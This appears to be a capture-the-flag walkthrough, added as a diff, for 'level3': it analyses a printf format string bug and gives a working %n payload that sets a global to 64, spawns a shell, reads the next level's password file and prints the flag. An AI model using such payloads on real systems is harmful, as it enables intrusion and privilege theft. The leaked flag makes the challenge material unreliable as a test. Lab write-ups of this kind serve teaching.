@@ -1,0 +1,103 @@
+# Level3 Walkthrough
+
+## Vulnerability Analysis
+
+This level demonstrates **format string vulnerability** for precise memory manipulation.
+
+### Source Code Analysis
+```c
+int m;
+
+void v(void)
+{
+  char local_20c [520];
+
+  fgets(local_20c,0x200,stdin);
+  printf(local_20c);
+  if (m != 0x40) {
+    return;
+  }
+  fwrite("Wait what?!\n",1,0xc,stdout);
+  system("/bin/sh");
+  return;
+}
+```
+
+### Key Vulnerabilities
+1. **Format String Bug**: `printf(local_20c)` treats user input as format string
+2. **Global Variable Check**: Program checks if `m == 64` (0x40)
+3. **Win Condition**: If `m == 64`, executes `system("/bin/sh")`
+
+## Exploitation Process
+
+### Step 1: Locate Target Variable
+```bash
+objdump -t ./level3 | grep " m$"
+# Output: 0804988c g     O .bss	00000004              m
+```
+Target address: `0x0804988c`
+
+### Step 2: Analyze Stack Layout
+```bash
+echo "AAAA%x.%x.%x.%x.%x" | ./level3
+# Output: AAAA200.b7fd1ac0.b7ff37d0.41414141.252e7825
+```
+- `41414141` (AAAA) appears at 4th position
+- Our input buffer is accessible via `%4$` parameter
+
+### Step 3: Craft Format String Exploit
+```bash
+# Payload: [target_address] + [padding] + [%n_write]
+(python -c "print('\x8c\x98\x04\x08' + '%60x' + '%4\$n')"; cat) | ./level3
+```
+
+### Step 4: Execute and Retrieve Flag
+```bash
+# After gaining shell access:
+cat /home/user/level4/.pass
+# Flag: b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+```
+
+## Technical Details
+
+### Attack Vector
+- **Type**: Format string vulnerability
+- **Method**: Memory write using `%n` specifier
+- **Target**: Global variable `m` at `0x0804988c`
+
+### Exploit Mechanics
+1. Place target address at beginning of input buffer
+2. Use `%60x` to print 60 characters (padding)
+3. Total characters printed: 4 (address) + 60 (padding) = 64
+4. Use `%4$n` to write character count (64) to address at 4th stack position
+5. Result: `m = 64`, condition satisfied, shell spawned
+
+### Format String Breakdown
+- `\x8c\x98\x04\x08`: Target address (little-endian)
+- `%60x`: Print 60 hex characters for padding
+- `%4$n`: Write total character count to 4th parameter
+
+### Stack Parameter Access
+```
+Position:  1      2          3          4           5
+Content:  [200] [b7fd1ac0] [b7ff37d0] [our_input] [...]
+Access:   %1$x   %2$x       %3$x       %4$x        %5$x
+```
+
+## Security Implications
+
+### Format String Vulnerabilities Allow
+- **Arbitrary Memory Read**: Using `%x`, `%s` specifiers
+- **Arbitrary Memory Write**: Using `%n` specifier
+- **Information Disclosure**: Stack/heap content leakage
+- **Code Execution**: Overwriting function pointers/GOT entries
+
+### Protection Mechanisms Bypassed
+- No format string validation
+- No stack canaries
+- No ASLR (predictable addresses)
+
+## Result
+- **Flag**: `b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa`
+- **Access Level**: level4 user privileges
+- **Technique Learned**: Format string exploitation and precise memory writes
